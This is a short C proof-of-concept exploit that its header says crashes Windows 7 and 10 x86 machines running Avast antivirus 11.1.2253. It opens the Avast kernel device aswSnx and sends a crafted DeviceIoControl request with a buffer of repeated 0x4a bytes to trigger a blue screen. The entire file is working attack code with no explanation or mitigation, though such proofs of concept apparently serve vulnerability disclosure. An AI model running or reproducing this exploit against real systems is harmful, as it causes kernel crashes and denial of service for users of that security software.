/**
* Author: bee13oy
* BSoD on Windows 7 x86 / Windows 10 x86  + Avast Premier / Avast Free Antivirus (11.1.2253)
**/

#include <Windows.h>

void BSoD(const char* szDeviceName)
{
	HANDLE hDevice = CreateFileA(szDeviceName,
		GENERIC_READ, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		0, 
		NULL);

	if (hDevice != INVALID_HANDLE_VALUE)
	{
		DWORD nbBytes = 0;
		CHAR bufInput[0x8+1] = "\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"; 
		CHAR bufOuput[0x8+1] = ""; 
		DeviceIoControl(hDevice, 
			0x82ac0170, 
			bufInput, 
			0x00000008, 
			bufOuput, 
			0x00000008, 
			&nbBytes, 
			NULL
			); 
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	BSoD("\\\\.\\aswSnx");

	return 0;
}

